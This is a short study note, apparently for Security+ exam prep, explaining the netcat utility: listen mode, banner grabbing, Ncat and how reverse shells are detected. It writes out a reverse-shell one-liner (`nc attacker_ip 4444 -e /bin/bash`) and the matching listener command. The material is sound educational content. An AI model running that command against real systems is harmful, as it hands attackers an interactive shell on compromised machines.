# netcat

## What it is
Think of netcat as a bare copper wire you can stretch between any two points on a network — it carries whatever raw data you push into it, no questions asked. Precisely, netcat is a command-line utility that reads and writes raw TCP/UDP data across network connections, functioning as a simple but powerful network socket tool. Because it imposes no protocol logic of its own, it can simulate almost any service or client.

## Why it matters
During a penetration test, an attacker who has exploited a web server can use netcat to establish a **reverse shell** — the compromised machine calls back (`nc attacker_ip 4444 -e /bin/bash`), giving the attacker an interactive command prompt even through a restrictive inbound firewall. Defenders look for anomalous outbound connections to unusual ports as a detection signature, since legitimate traffic rarely looks like a raw TCP stream carrying shell I/O.

## Key facts
- **Listen mode** (`nc -lvp 4444`) turns netcat into a server waiting for incoming connections — foundational for catching reverse shells.
- **Netcat does not encrypt traffic** by default; all data, including credentials, transmits in plaintext, making it detectable by IDS/IPS signatures.
- **Ncat** (from the Nmap project) is the modern successor, adding SSL/TLS support and access control, often seen on Security+ as a comparison.
- Netcat can perform **banner grabbing** (`nc target 80`, then send a raw HTTP request), a passive reconnaissance technique to identify service versions.
- Many Linux distributions ship a version with the `-e` (execute) flag **disabled** by compile-time option specifically because it trivializes reverse shell creation.

## Related concepts
[[reverse shell]] [[bind shell]] [[banner grabbing]] [[port scanning]] [[network reconnaissance]]